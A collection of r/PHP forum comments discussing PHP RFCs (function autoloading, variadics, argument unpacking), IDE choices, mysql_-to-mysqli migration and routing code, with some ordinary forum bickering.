I'm not entirely sure how I feel about the $type stuff. I like Anthony's alternatives more: &gt; That's why this is a RFC which is up for discussion. That's why this is a draft instead of a proposal. Would you rather see: &gt; bool php\autoload_class_register($callback, $prepend)) &gt; bool php\autoload_function_register($callback, $prepend) &gt; bool php\autoload_constant_register($callback, $prepend) &gt; Would you rather having the single autoload regstier, but enforcing that type must be a single type? &gt; Would you rather see interfaces? &gt; interface php\Autoloader {} &gt; interface php\AutoloaderClass extends php\Autoloader { &gt; public function loadClass($name); &gt; } &gt; interface php\AutoloaderFunction extends php\Autoloader { &gt; public function loadFunction($name); &gt; } &gt; interface php\AutoloaderConstant extends php\Autoloader { &gt; public function loadConstant($name); &gt; } &gt; bool php\autoload_register(php\Autoloader $loader, $prepend); How do folks feel about those two approaches?
Sure I can see that. I guess it doesn't matter if its pretty or not, as this will be tucked away in bootstrap somewhere like most class autoload logic is now. Another tough pill to swallow is the new php namespace. I know its beneficial and people have been clamoring for namespacing core functions, but the trolls are going to have a field day if this is the only function added to the namespace. We obviously cant just namespace everything and we can't not namespace stuff ever, but having some and not others in there is wildly inconsistent. Nothing about it seems easy.
Im not, why you gotta take what I said and make me a dick?
Oh, I agree. There's a balance to be struck. But when you're hiring jr people who don't know what "foreach($array as &amp;$item) {}" does, for example, you have to be careful with how terse your code is, or the ramp-up time for them to get to intermediate is going to kill you.
That escalated quickly!
Yeah you basically pointed all the advantages that I thought about :). I think that I'll go for the full api solution. 
Just so you don't get your hopes up too soon: It is not unlikely that this proposal does not pass (I'm pretty sure that variadics will get in though.)
I will def. do that probably by tomorrow, I'm pretty busy this morning. 
I have programmed with Ruby extensively. It was the primary programming language I used for an entire year as the sole developer for a tech start-up. That is why I said this has nothing to do with monkey-patching. Your explanation does not make variadics have anything to do with monkey-patching no matter how many times I re-read your comment. As far as security, why you think adding readable syntax to an already used pattern makes it less secure is truely bizarre. I genuinely have no idea what you are talking about - and it's not for lack of trying, or re-reading. As for docs, thats easy to do with docblocks. That's what they're for. /** * Favorite one or more statuses. * * @param string $screenName * @param Twitter\Status ...$statuses * * @return array[League\Twitter\User] */ public function favoriteStatus($screenName, Twitter\Status ...$statuses) { Stop telling me to re-read stuff man, it's really weird. You're wrong, you've been down-voted to shit and you keep assuming im an idiot - which isn't very helpful to the conversation.
The double negative was intentional \^^ "unlikely that the proposal will pass" sounds too strong, I'm not *that* sure it will fail. Just not really confident that it'll pass.
The only problem I have with the interfaces is that you then cannot define a simple closure to act as the autoloader. Not that big a deal, sure, but I think the first syntax (three discrete functions) is best.
I would very much be interested in the results of this review, is there a way to have any of the findings be made public or would your company object to that? 
If you don't want to use WordPress, use something Open Source. http://anchorcms.com/
I understand you want to move away from WP. But what do you use WP for? The codebase (which is horrible) or the eco system (tons of plugins and themes). And is Statamic free?
That negates the point of having a namespace at all though doesn't it? Right now the global namespace is "". That would make the global namespace "php\". Anything that doesn't specify a namespace (currently everything) would still clash, because they have the same name in the default global namespace.
[Here](http://philsturgeon.co.uk/blog/2013/08/potential-variadic-function-syntax-for-php-56).
I don't care about either, tbh. The site is a basic static site with a contact form and possibly a blog. Wordpress is, unfortunately, very good at that. Well, maybe not good, but easy. I suppose the themes are a factor, too. 
This pretty much looks like a blog, not really offering what I'm looking for, but I'll give it a better look when it's not 4:30am. :)
You'd probably have to use a CI service like Travis.
If you are too stupid to avoid this mistake, flip burgers for a living. You are *too fucking dumb* to be trusted with anything higher than trivial responsibility. There is no hope.
Another thought: The biggest issues I see with going client side is that my web app would require JavaScript at that point. I've also read that using PUT and DELETE with AJAX can be problematic, as not all browsers support it.
We ran into this issue a few months ago (running 5.5 betas) and made the same change to fix it. Regarding your last note about posting messages starting with "@", you still need to check for this when using PHP 5.5, because @ is still interpreted as a file upload (it just adds a deprecated notice). We opted to prepend a space which FB will trim, does it do that with a "." as well?
[wat](http://www.timeanddate.com/library/abbreviations/timezones/africa/wat.html)
sorry for answering late. yes, i know how to write tests, but i don't really know how to approach this one, because it's an image manipulation program. how do you unit test an image?\^^
To me it would feel more natural to have the operator after the argument. Like grabbing its tail and stretching it. f($bla...); f([1,2,3]...); But maybe that's because I'm used to it this way from [Go](http://golang.org/ref/spec#Passing_arguments_to_..._parameters).
Gotcha. CI is used to automate running tests, Goutte is a tool that can be used to produce some tests. There is no reason it would be one or the other. Step #1: Make the tests. Step #2: Manually run them, or put them on a git hook locally. You can just stop here easily enough. Step #3: Fire up a random EC2 box with Jenkins on it to clon and test the code on a service hook. Your live site might not have CLI access, but you definitely don't want to run tests against your live site.
To me f(...$blah) looks like the function declaration means zero or more arguments, where f($blah...) looks like one or more arguments. That's minor stuff, and I would like these proposals to be approved one way or another.
classic op
The three dot notation is used in other C-like languages (ecmascript 6, go), so I imagine that's why it's the proposed notation here. Not all syntaxes are pretty, but there is definitely value in consistency.
Cool, and yes, I very intentionally started with an API. My big concern still is the OAuth2 grant type. I've heard implicit isn't very safe at all. Having said that, this particular web app isn't super sensitive from a security perspective.
&gt;&gt;you definitely don't want to run tests against your live site Why not? For our smaller sites (the ones I'm concerned about here ...), there is no dev version and everything happens live. There are regular db backups and everything is under version control, so that provides a lot of security. I haven't seen it cause any serious problems in the 4-5 months I've been here.
So, why not do both? Have the website work without JavaScript, but enhance the experience if it does. 
Is there any particular reason why the RFC decides to go against the C++ convention of "*unpacking*" with "*...*" **after** the pack-in-question?
I advice against testing against live based on what I expect my tests to do. My tests create users, create friends, active emails, etc. If you aren't doing that then testing against live isn't so dangerous, but then I'd have to wonder what you're actually testing. If your tests are just making sure the pages are up and retuning 200's then something like Pingdom would be much easier to handle. People normally test their CODE, not their actual live website.
&gt;I'd have to wonder what you're actually testing. For these particular sites there isn't a whole lot of "create" going on. Mostly "read" and "redirect" that I'm worried about. For sending emails we'll probably just add some sort of "debug = true" to the $_POST and make sure it sends successfully to a fake address. &gt;People normally test their CODE, not their actual live website. That would explain why it's been so hard to google for this. 
Running anything on your computer slows it down... so it really depends on how much headroom your system has based on your current usage. I have run [AMPPS](http://www.ampps.com/) before and noticed only a very small decrease in speed, personally.
For image heavy sites, ajax can be your friend. My personal preference for ajax/javascript in general is to use jQuery because it's so incredibly simple to use: $.get('http://your-address/controller/etc', {sendSomeData: "here"}, function(response){ // handle response here alert('Server says: '+response.message); // or whatever (json) } Check out [this](http://jessdirtyyy.tumblr.com/archive) tumblr theme as one that uses lazy loading, i.e. endless scroll calls to the server to get more content only when necessary. You can have the server reply w/ html or json formatted data. If you don't have [firebug](https://getfirebug.com) installed, get it and you can watch the ajax calls fire in your console. Ajax can be super useful for "lightbox" style windows as well and grabbing detail content from the server without reloading the entire page. Best thing to do is just experiment with it. Also, you are a smart guy for learning COBOL. I hear there are buckets of mind-numbing money there as all the baby boomer COBOL guys retire. 
I'm afraid I can't make it public. All files are transferred via a secure upload system, attachments are instantly rejected and I got a telling off from one of the sysadmins for attempting it. I'm also under NDA and I'm not allowed to talk about any specifics. If you give me time I can write up a summary of how I went about it. But first I need to see what kind of response I get back from them on Monday. The tl;dr of it is: Laravel is awesome. The only negative thing I found in the code base was the inclusion of [doctrine as a dependency for a tiny feature](https://github.com/laravel/framework/commit/f8c8051ee67589a1451f2ba93dde3911044c7462). The rest of it is well executed and while there may be dangerous functions in some of the included libraies, nothing that touches the user facing application cuts corners when it comes to security. It's well thought out and well executed and it's deserving of it's reputation.
&gt;I need to connect to my API otherwise the app won't work at all. I know that. If the app isn't a RIA, the question is whether you want to do it quick, or if you want to do it right. Not that the right approach takes significantly longer. If you do it the right way, and implement it via PHP, it would mean that it would work regardless if JS is available. That is, it'll work on all the browsers, regardless if it's a PC, tablet, phone, toaster or whatever. &gt;I'm considering a JavaScript approach Whether JS is a feasible option depends entirely on whether you think it's (A) acceptable to ignore users simply because they don't have JS available, and (B) on what domain your API is hosted. If the API is hosted on a different domain, you won't be able to access it via JavaScript without a server-side proxy due to the Same-Origin Policy, unless you have CORS set up. &gt;No enhancing happening. No, but if you made it to work the way it's intended to work as per the mechanics of the web, you could simply add JavaScript as an additional layer on-top of it and enhance the experience by pulling the data from the API, sparing the need for a page reload. It's simple progressive enhancement.
Try [Codeception acceptance tests](http://codeception.com/docs/04-AcceptanceTests). Super easy to use for what you're looking to do.
Eclipse is a monster. It's like throwing a nuclear bomb on an ant pile. Do you really need such a massive program for PHP development? Have you tried something like PhpStorm, Netbeans, Komodo? Do you have a debugger installed? Xdebug is the de-facto standard. IS there a reason you're developing locally on IIS? Is your prod server running IIS? If not, why not use a VM to simulate your development environment? I promise it's really easy. I'm also not positive if IIS plays nice with XDebug. I'm not sure if Visual Studio 2012 has proper PHP support, much less debugger support. If you have a debugger installed, did you start a debugging session in your browser or CLI? There's a bunch of things you need to do *before* you try to actually debug something.
I have 804 GB free of 899. AMPPS looks promising, might try thanks alot. :)
It says 'Don't listen to me', right above you. So...yeah. But your also a mod, so...idk what to do here lul
&gt;but it does mean a bit more work. Not significantly so, no. 
Thanks for the info. When I learned PHP and javascript, they were both seperate courses. I never learned how they work in unison, and I have also never touched AJAX or JQuery. So my question is if I make my site purely out of php (which I am most comfortable with), would it be easy for me add in AJAX scripts at a later time to experiment with? Ya, not a lot of people learning COBOL anymore, I am by far the youngest person working at the bank. It also isn't going to be going away anytime soon because it would cost banks a crazy amount of money to switch over to something else. They have the mind set that if something works why change it. As for the money its not bad, since I'm just out of school with no experience I don't get paid anything impressive. But some of the people that have been there a while do make really good money. Especially the contractors. 
Good thing I'm around to tell you it's okay to follow his instructions, then. 
I have no debugger installed. This is probably step one I need to work on. I will do some research on iis and a php debugger. Production server is using IIS. I do contract work for a guy in town and do a lot of front end and some minor back end .net programming. I don't have debug functionality on that either, that is why I'm running the iis and sql server. I've heard of phpstorm and netbeans. I had once installed eclipse when I was going to attempt some android app development but I didn't have the time... That is why I attempted it with eclipse.. because it was there. VS has 2 php extensions/add ons for php. I do most of my work in VS because of the majority of my work comes from the contract work with that guy. It is all .net ecommerce sites. I appreciate what you did reply with. I have no problem doing the work to figure it out, and during this weekend I have some time between projects so I will be working on this.. thanks!!!!!
I meant more in terms of RAM =D It was a very simple way to set it up. It clashes with IIS so you will need to disable it or change port numbers.
You'll want to use javascript to manipulate the DOM (your html). Load the initial page w/ php, then alter that page using ajax calls back to your server grabbing snippets of html (generated by php). The returned html snippets are then inserted into your existing html without reloading the page. Check out this fiddle http://jsfiddle.net/pJRuA/2/ You would usually have two separated controllers in your php. One for the main page load, then another to grab html or json data when ajax calls come in.
Well. Testing in production is called monitoring. 
I could only wish... The developer is gone... 
Thanks for the chill pill... There are *only* 1,700+ calls to mysql_ routines... He never supplied any tests... I am testing with MY test data right now and the sky isn't blue and everything isn't wonderful... he is gone. I won't need PDO... mysqli_ will be good enough. Yeah, "presto!"... huh.
You offed him just for writing **mysql_** code?! *I'm worrying now...*
Well... not *exactly* offed... But he did completely ignore my guidelines for database name and password. I found them defined and used in **three** different places. Yeah, and he ignored my directory structure too. Used an include directory in a completely different place for include files that I supplied. Oh, yeah, and he made frikkin' **copies** of my page header and footer templates, so now I need to make changes in both places. Now, I ask you, what fate would you have given him?
function autoloading, namespaced function importing, variable argument syntax, argument unpacking -- awesome days ahead for PHP.
You sound like you were managing him. How did you not spot any of these errors sooner?
Managing, no. He was given an assignment and guidelines. He kept saying, "Yeah, yeah" whenever I asked if he understood. He uploaded the code, and asked bookkeeping for payment ("I need the rent."). I authorized the payment without a complete test. MY FAULT He was asked to provide documentation. The payment was the last goodbye.
You need to state a scope before you can have a "better approach", otherwise its all just subjective opinion on how flexible you want x to be or how much it should do. This does contain quite a few bad practices, though. * It's not performing a single job, i.e just matching a request to a route * It's calling an immediate exit, not allowing surrounding code / error handling to continue control flow. * It's trying to send headers when it should just be matching routes * It's declaring what is a critical server error (sending a 500 header and exiting) and what isn't, itself * Convoluting request method and route together in a string when they could just as easily be separated data * Assuming that routes should be case insensitive * Calling a function instead of handing back a matched route to be used however * Again, exiting and killing control flow of a surrounding application when it could just be returning an error or match and allowing error handling. Quite a few of these could be excused by wanting this to be *simple*, or *all-encompassing*, but again you've stated no scope - so what the function '*should* be', I imagine will be different in everyone's mind. However most of these points I also would consider bad practice in general for any function.
I hate the functional way and prefer the non functional way. Define `isGet` and `isPost` and `isRequest` for both `GET` and `POST`. if (isGet()) // equivalent to GET / { /* your code here */ elseif (isGet('front-page')) // equivalent to GET /front-page { /* your code here */ } elseif (isGet('members', 'all')) // equivalent to GET /members/all { /* your code here */ }
Is this a hosted solution?
no, it's an application install, much like Wordpress.
Deprecated*
No, his code does not have the 1,700 calls. I am using a library. His code contains 35 calls to mysql_ functions. He provided a section of the site that I could not. Calls that allowed people to manage their profiles and calls to charge companies through credit cards via Paypal. I have worked on this project for some time now. I don't know enough of the "best ways" to do things.
Unless your controllers/actions are all going to be 1 line long, your routing closures are going to get way out of hand real fast.
[I was.](http://php.net/manual/en/datetime.construct.php#refsect1-datetime.construct-changelog) &gt; If time contains an invalid date/time format, then an exception is now thrown. Previously an error was emitted.
http://php.net/manual/en/function.date.php `W`, `A` and `T` are valid time characters.
Xdebug is your friend
The assumption that I had was that 'WAT' would be considered an invalid date/time format because something like "35AMUTC" doesn't make sense out of context. I do realize now that WAT is a valid date/time format despite the format returning a useless string.
You need to reconsider your preferences.
 f(func_args($args)); f(func_make_args($args)); f(list($args)); f(with($args)); f(with $args); f() with $args; Perfectly legible and does not need the parser to parse dots differently. Also, the mixed splat &amp; non-splat &amp; then splat again argument injection is just introducing Code Smell right there. Stop that. Don't allow that please. By only allowing splat at the end, the developer is forced to write better, more conprehensible code.
See [glue.php](https://github.com/jtopjian/gluephp/blob/master/glue.php) for inspiration, good code and flexibility.
- No namespacing - ksort usage makes no sense - should consider using ReflectionClass for class instantiation with indefinite params instead of preg_match array - should utilize return instead of \$found=true - the preg_match allows urls like /url/index.html/ and /folder//
As mentioined, most things in **mysql_** based functions are available in **mysqli_** ones, the main difference it most of them that are not working with resultsets require the varable that contains the link to the database connection as the first parameter, where in with **mysql_** ones use that as an optional second paramerter. Example of old: mysql_connect('localhost','user','password'); mysql_select_db('database'); $rs = mysql_query('SELECT * FROM data'); if ($rs &amp;&amp; mysql_num_rows($rs)&gt;0) { while ($row = mysql_fetch_assoc($rs)) { echo $row['field1'],' - ',$row['field2']," &lt;br&gt;\n"; } mysql_free_result($rs); } else { echo "&lt;em&gt;No Results...&lt;/em&gt;&lt;br&gt;\n"; } Example of procedural mysqli: $db = mysqli_connect('localhost','user','password','database'); $rs = mysqli_query($db,'SELECT * FROM data'); if ($rs &amp;&amp; mysqli_num_rows($rs)&gt;0) { while ($row = mysqli_fetch_assoc($rs)) { echo $row['field1'],' - ',$row['field2']," &lt;br&gt;\n"; } mysqli_free_result($rs); } else { echo "&lt;em&gt;No Results...&lt;/em&gt;&lt;br&gt;\n"; } While still need to test, quick work will be change the main connection, and then to do search for mysql_query( and replace with (assuming the link is $db) mysqli_query($db, (and any other non-result operation function) then everywhere else search replace **mysql_** with **mysqli_**
Can you explain?
I agree with this, both points make sense to me and the '...' is just plain ugly. Apart from this, the concept of splat arguments is a very welcome one, kudos to nikic.
Whether you like it or not, it will at least be familiar to PHP devs from the other lang they're likely to be using often: JavaScript, since it's virtually identical to the ECMAScript 6 [spread operator](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Spread_operator). Syntax prettiness is subjective, but consistency is not. 
While I like your idea, mobile devices are pretty limited in terms of memory and frameworks such as Angular or jQuery consume quite a bit of it. Again, I'm talking about mobile devices, on a desktop or notebook this solution could work beautifully.
Missing namespacing is a big issue unhandled by author. There are workarounds. Return value is not needed - function succeeds or throws an exception. $found is an internal flag serving this purpose. Usage of preg_match is actually a strong point - you as the user have the option to both handle or disallow url examples you've mentioned. Freedom is good.
Hi, first, thank you for that glorious PuPHPet of yours, it made my life much easier. But I noticed that phpmyadmin is not installed correctly with it, these commands are needed to be displayed on /phpmyadmin url: $ sudo ln -fvs /etc/phpmyadmin/apache.conf /etc/apache2/conf.d/phpmyadmin.conf $ sudo service apache2 restart I am still a linux noob, so I can't tell if this is vagrant or puphpet mistake, but I thought you should know.
&gt; won't get you anything except the oft-touted, never-used ability to switch to a new database engine. What about better protection against data injection?
Thanks for these comments! Rewriting this based on your feedback. Regarding the convolution of the route entries (method + path), I went with this so the routes structure would be a simple associative array. Looking on how to get around this.
Yes, although this should support any callback passing technique that PHP supports (method call via array, function name, callable object, etc).
ah, yes, this improves it. although I'm still aiming for a flatter route structure. looking into it.
If I was in your position I would use progressive enhancement. A concept where you start out with building a basic version for the lowest common denominator, and then add features above for additional features. Using this approach I would start out building your site, image gallery or whatever, just using PHP. This will give you a base working product. The building process would likely give you some challenges in building a full product, but will give you the familiarity and calm of working with technology you already know. When you have the working product (better done than perfect, no need to add all the functionality you can think of, just what you actually need) you can start adding on features like asynchronously loading images using JavaScript/AJAX. This gives you the chance to learn new technologies by building a product that you can actually use. You already have a working product with the features you want, so you should have a clear idea of what you want to achieve, but you have the challenge of learning new technology and combining it with your existing knowledge.
Thanks. I'd really like a button that throws more upvotes your way. Thanks for taking the time to explain.
&gt; No namespacing It's a single class that's less than 100 lines long. Who cares?
Then why is it a class if it's just one static function?
Shrug, no idea. But namespaces wont solve anything anyway.
I found PuPHPet the other day and can highly recommend it! It works great out of the box. Gone are the days of manually configuring a vagrant box for testing. Try it out, you won't be disappointed.
Thank you this is good advice, It is what I was leaning towards doing too. 
Why the mass downvotes? I'm very confused.
mysqli and pdo provide much the same input data injection protection, as far as I know.
Check out Slim Framework. It has all of what you are doing an addresses most if not all of the concerns in the comments. It's mainly a well crafted routing package without the overhead of other frameworks.
&gt; Using PDO means code that is more OO in style Same is available with mysqli. &gt; A clear advantage of PDO is the ability to use named parameters. mysqli_ supports that.
PDO doesn't get you any better protection against data injection than mysqli offers. And to be clear, you still aren't fully protected, so you can't just use PDO and pretend that the problem doesn't exist.
&gt; General PC salute!
Almost nothing deserves a fatal error; I wish we could get rid of most of the one's we have. Sure the engine can't continue if you've run out of memory or stack space but most of the time it can continue. But I disagree about an exception; the engine doesn't throw exceptions so we shouldn't start now. Just trigger a regular error. I have a suggestion, maybe you can implement for a future RFC. We already have ErrorException, so how about a simple API call to turn all notices/warnings/exceptions into ErrorExceptions. You can do it yourself with about 5 lines of code, but it might get used more if it was built it. 
I have to work with Zend Studio but i tried out PhpStorm and man this IDE rocks. It's super fast and does everything you want (maybe not as much as sublime but i never used sublime). Zend Studio (Eclipse) is really slow, and Netbeans is fast, but lacks of certain features. If you are looking for something new to try out, i would strongly recommend PhpStorm to you.
This. Sublime Text used to be my editor for everything. Now I mostly use it for editing csv files, and taking notes...
I hope this does pass along with the variadic usage; it seems like a small modification with very few consequences. It even improved performance! It's hard to imagine why it wouldn't be included but I have been disappointed before. Oh, and that isn't a double negative it's a truely exceptional triple negative: *not* *un*likely does *not* pass. :) 
vim
Thirded... PHPStorm is the best IDE for PHP focused web dev, and it gets better all the time.
Netbeans.
I think we can mark this post as the millionth post discussing which IDE is best.
Netbeans.
Vim with a lot of pluggins.
Definitely agree PHPStorm rocks. It also does way way more than Sublime Text. With the biggest feature being the ability to debug.
forever
I''ve already tried PhpStorm but the all project thing was too complicated. I mean importing project is too fastidious. It's as simple as on ST. But like @Cheeeeeese said ST is not an IDE. I think it might worth the shot to try again :)
I tried Vim once but as I'm not always under *nix or OSX, configuring vim in windows is really awful. Plus, I always see badass conf of vim on the internet, but I really don't know how these people do it.
Komodo Edit is my weapon of choice. Free and extremely feature rich; it seems like everyday I am discovering something new. I have converted my entire office to it. My coworkers were a mixed bag of Eclipse, Notepad++, Notepad2, and Dreamweaver users. Now they all swear by it.
Which ones ?
Just because you prefer a text editor does not mean someone who uses an IDE isn't as good as someone who does. I use a text editor for certain things, phpStorm for others.
How much did you spend ? I mean you buy it but then you don't have a lifetime license so how much would you say you would spend over 3-4 years ?
Excuse me, but what? Is their some mythical IDE I haven't heard of that does your coding for you? If you don't understand the language in an IDE you're not going to do any better in vim.
Oh dear god dreamweaver... I'd rather use notepad.exe
In that case do you use a code formatter ? if so which one.
Create your project "from existing files". Then just follow the steps. Granted it can feel a bit overwhelming and confusing up front, but all the settings help set PHPStorm up to integrate seamlessly with PHPUnit, Xdebug, etc which is highly dependent on how you have you development environment set up.
Nerdtree! 
After switching to Ubuntu, Notepad++ I do miss :(
I agree that PhpStorm is badass, but I'm not sure why you were experiencing so many bugs with Sublime Text. ST is the best text editor I've used - easily... and I don't think I've ever experienced any bugs. I'm even using the ST3 beta and it's been smooth sailing as my daily editor. Perhaps you had a cruddy plugin installed?
It's not actually that much. 100 lifetime I think. 
It's not actually that much. 100 lifetime I think. 
I use phpstorm for projects, but phpdesigner for editing on the fly. Phpdesigner is really good for working with php files. Edit: phpdesigner 8 is made by mpsoftware
i use phpdesigner 7 because i stumbled on it at highschool and since then im used to it. its not really the best out there i think but the automatic code mark up and ftp functions are quite nice
I use Komodo IDE, it does everything I need of it, I love the regular expression editor, http listener, remote debugger, the new komodo sync, and even the profiler. I've been using it for 5 years now, since it came out. The only negative thing I'll say about it is the price. I would probably not be willing to pay for it out of pocket. I know it's not very popular amongst the php subredditors and I'm likely going to be downvoted because people seem to prefer phpstorm
Vim, Sublime Text 2, Coda 2, PhpStorm
Emacs with evil mode aka vim like keybinds
I do love a lot of features of NetBeans, but I've invented completely new swearwords when I'm trying to push out a quick fix and it's dicking me around with the auto-close quotations. And yes, I know they can be switched off. They are switched off. It still does it. "Oh, you want a quotation mark? Okay, you'll want another one then. Oh, you didn't? Okay, I'll delete the first one for you, too. Save you a bit of time". **FFFUUUUUCCCCKKKKK YOUUUUUUUUUUUU.**
Coda 2
NetBeans! One IDE to rule all. Actually, eclipse gives tough time but am now addicted to NetBeans. I mount remote file shares on my machine using sshfs if an on a high speed network, then NetBeans can use the local folder as project folder.
Love Komodo as well, I've been using it for the last couple years. 
Me: I want to replace this block of text and replace it with a quote Net beans: oh, you wanted all that text in quotes?
Lifetime is not accurate. When you buy a license for PHPStorm you buy it for that specific version then plus a [year of free upgrades](http://www.jetbrains.com/phpstorm/buy/index.jsp).
PHPStorm is the bee's knees. :D
I held out for a long time, and Komodo Edit was OK for a while, but I just made the leap and boy is there a difference. Now, if only LiveEdit worked with the Inspector Panel open... and maybe offered bidirectional editing like Emmet LiveStyle
Thank you. 
Coda! It is awesome and very intuitive note: I'm someone who is very much into UX and hate (as in, don't like to use it) commandline ;) 
Hahaha, I know this pain! That feature is on the border of helpful and infuriating. Edit, knew -&gt; know
You: Goddamn it, I'll have to delete the quotes now. Netbeans: Good luck with that.
It's very bold to claim any one of Storm's features is its biggest!
Yes I still am annoyed by it occasionally. Because it want you to have a deployment server and the like and often I don't use that. It's just a matter of figuring the click path to avoid all that ;)
I got made to use Netbeans in my last job, and I now use Vim, and I am a damn sight more productive in Vim than I ever was in Netbeans - my workflow in Vim obliterates the workflow I had with Netbeans. The completion in Vim runs rings around every IDE I ever tried. Also, unlike Netbeans it doesn't aggravate my RSI.
I like Netbeans as well. Most people at my work are using PHPEd and it's okay, but all the key combinations annoy the hell out of me. Ctrl-W don't mean close, Ctrl-H doesn't mean replace, and doing a search will always start from the top of the page instead of your cursor.
I think /r/PHP persistence helped me convert to PhpStorm from NetBeans (I had to validate the need to pay for it) but I really love it now. I started a new job a month ago, where you code local and run the project on a remote server. The dev helping me setup explained his Sublime 2 had automating rsync. I said I was using PhpStorm which he didn't know. I jokingly said "but it's the best IDE". Somehow he got upset and made snaky comment like "well let's see if it can rsync". Well no but there is built-in SFTP support with all the sync options you can think of :) My only problem with PhpStorm is that I have the disturbing feeling to only use like 20% of its possibility. I guess you can have that with any big IDE though.
Netbeans + Notepad++ for editing small scripts, taking notes etc.
I'd say that phpStorm is the best because it has a great version control plugin, it has markdown support via the plugins. It has built in file watchers for things like LESS &amp; SCSS &amp; Coffeescript compilation. It has amazing javascript introspection such that you have good auto-complete. It has amazing phpDoc &amp; JsDoc support. You can have multiple projects open simultaneously. The IDE is fare more flexible than netbeans. Fonts always look good no matter what Operating system you use. It has features in droves. There are not too many things it does not do, it follows the entire life-cycle of php application development, and not just php apps, but also more modern js app development.
If you are on gnu/linux try kdevelop-php out, powerful, fast, simple.
 use rygu\mktime; mktime(); \php\mktime(); is totally unnecessary because this what you do now: use rygu\mktime; mktime(); \mktime(); 
Right, but thats what it is now. use rygu\mktime; mktime(); \mktime(); I'm saying that whatever the default is is the default, so changing the default doesn't make a difference.
Right. http://philsturgeon.co.uk/blog/2013/01/php-6-pissing-in-the-wind
I use the Crimson Emerald text editor
Something about great minds thinking alike, am I right? :)
I agree that Sublime is not an IDE but it is my favorite text editor by far. I also do not know what bugs you are experiencing.
99% PHPStorm and 1% Sublime Text. PHPStorm lacks the smooth multiple cursors feature that Sublime has. Every now and again I'll need it, and will just open the file in Sublime to use it. I also miss the minimap and fading caret that Sublime has :(
Coda2 on Mac (my preference) Notepad++ on Windows What am I missing?
Komodo Edit, since I am a polyglot, and have occasion to write Javascript (more frequently than PHP really, and Komodo Edit has had auto-complete/intellisense for Javascript since *at least* 2007, when I recall my manager at Yahoo! taking note of me using it), Tcl, etcetera. Komodo also supports Perl, Python and Ruby though I use these much less frequently than the others I've mentioned.
Maybe like $50 a year. It's cheaper to upgrade than it is to re-buy. Also JetBrains is constantly having sales so if you just wait a month or two it will go on sale. 
How is sublime-text not the top editor here? It's the best editor I've used. Fast, responsive and plugins give you all the features you need. It's configrable as much or as little as you need. If you have not tried it out yet, do it now. But don't forget to install all the PHP and framework specific plugins.
Notepad++
Coda 2 for me. I like the interface, and the built in functions. That plus the Emmet text expander and the yui compressor plugin, and it's got a nice work flow going. 
Wine?
fifthed. Although I use NetBeans 
spf-13 is a good start and very customizable.
Sublime Text 2.
Unless your database is full of credit card data of your customers, then dropping the database is the least of your worries.
I didn't down vote anyone :-P 
Type 'sudo apt-get install wine' into a console.. Or do you mean the Notepad++ part? I'd have to test ot, but it likely doesn't differ much from Windows. 
I've always used Notepad++, but that only gives you code formatting and nothing else.
Perhaps context would help. I am a 4th yr student, who has worked with far to many other students who use their IDE as a crutch for their work. Then they come to class complaining that they can't get their code to compile outside of the IDE. I have seen far to many profs cave and then allow students to submit their IDE project as a whole, rather than the compressed version, or executable. I see that IDEs have their place, and have recently been working with one for a few projects, how ever that was only after I felt confident enough in my understanding of the mechanics of the systems. 
Just any part of wine, I know it exists, but last time I tried it was years ago, and I remember it being a nightmare :/
Just to let you know, you can fully customize keyboard shortcuts in PhpED (Tools -&gt; Settings -&gt; IDE Shortcuts) Also, the issue with search, it has the option you select if you want it to search from cursor position, or for the whole file. Also you can select it when it gets to the end if it will wrap back at the beginning.
If it works, it works. If not it can be a bit tricky, yes. But generally it isn't. And if it's not a game or similar chances are good it works without much hassle. It's definitely worth a try, since it gets better every version.
I payed 80€ for a lifetime license with one year of free upgrades if a new version is released in that timeframe.
I will have to look into this and try again! Thanks
I liked the look if it. But one very basic thing that is present on every IDE I have ever used, and after searching seems oddly left out, is multiple projects. You seriously have to open a new instance of the IDE for every project? Or is there a project explorer now?
Notepad++ was one of the only Microsoft Windows programs worth paying for. Under Ubuntu I would rank Sublime Text no.1 for commercial, and I like Geany for free. Phillip.
Namespaces are to prevent naming collisions with *3rd party* code, not your own. They're just as useful for 1 class as 100.
Oh my God it's almost as if not everyone is identical what the fuck I'm contacting the papers.
Yeah, we get it. You're a pretentious know-it-all who with a inferiority complex. We gathered that from your first comment.
&gt;&gt; A clear advantage of PDO is the ability to use named parameters. &gt; mysqli_ supports that. I wasn't aware of that. I thought `Mysqli` prepared statements could only handle the question mark placeholder. Can you provide an example of using named parameters in a `Mysqli` prepared statement? We're talking a built-in `Mysqli` library feature, right? Not additional PHP code needed to parse a string representing the sql statement and selectively replace parts of the string before executing the query?
While those features may be present, I believe mattaugamer is arguing for code modularity and maintainability rather than condemning the use of mysql/i. 
Can this provide nested routes, like: index.php?a=blabla&amp;b=albalb&amp;c=xxx&amp;y=xxxx&amp;z=xxxxxx so i can get: index.php/a/blabla/b/albalb/c/xxx/y/xxxx etc.. What are best practices? I'm not familiar with routing. 
.... it was free? Or are you saying if it was paid, you would buy it? Haha, I'm tired
I recommend Sublime Text.
(Like I've experienced with a Slim Framework project.)
Indeed. Which are things we're supposed to care about as professionals. 
While I agree, arrays aren't the same thing and would love named parameters, theres a much cleaner way to handle your defaults values when passing an array of parameters: http://php.net/manual/en/function.array-merge.php Just create an array of defaults and merge them. Still not ideal, but a whole lot easier to maintain than your example.
Yes, that is also typically how it's done in JavaScript.
I thought exactly the same thing as you did when you quoted the RFC "conclusion". &gt; Discussion &gt; &gt; We don't see the real need for named parameters, as they seem to violate PHP's KISS principle. It also makes for messier code. &gt; Conclusions &gt; &gt; We do not want to add it. I mean it almost seems like a 10 year old saying "I don't like it so we won't include it". I don't even remotely understand how it can be messier than ugly uncheckable arrays. Named params + function overloading would be great additions IMHO.
There's a simple solution to OP's problem: don't create a method with 5 parameters. In fact if OP is really creating a class method, then most of those parameters could be class properties with getters/setters.
&gt; whereas most people advocating mysqli are basically just advocating adding "i" to all the mysql_ extension calls From my understanding and experience in following similar conversations, people tend to say "just append `i` to `mysql`" just because it's feared/understood that most people who still instinctively cling to the old `mysql` library today are not familiar with safe database or coding practices, let alone OOP concepts. I see it as an attempt to gently help inexperienced or stubborn programmers to more comfortably slide into better and safer programming paradigms.
That's great in theory, but not always practical. You still end up with way more code than is necessary both on the library and caller sides. While in some cases long argument lists can be a code smell, it's not a 100% accurate indication of poor quality.
Array merge definitely looks nicer: public function getFriends($args) { $args = array_merge([ 'user_id' =&gt; null, 'screen_name' =&gt; null, 'cursor' =&gt; -1, 'skip_status' =&gt; false, 'include_user_entities' =&gt; false, ], $args); }
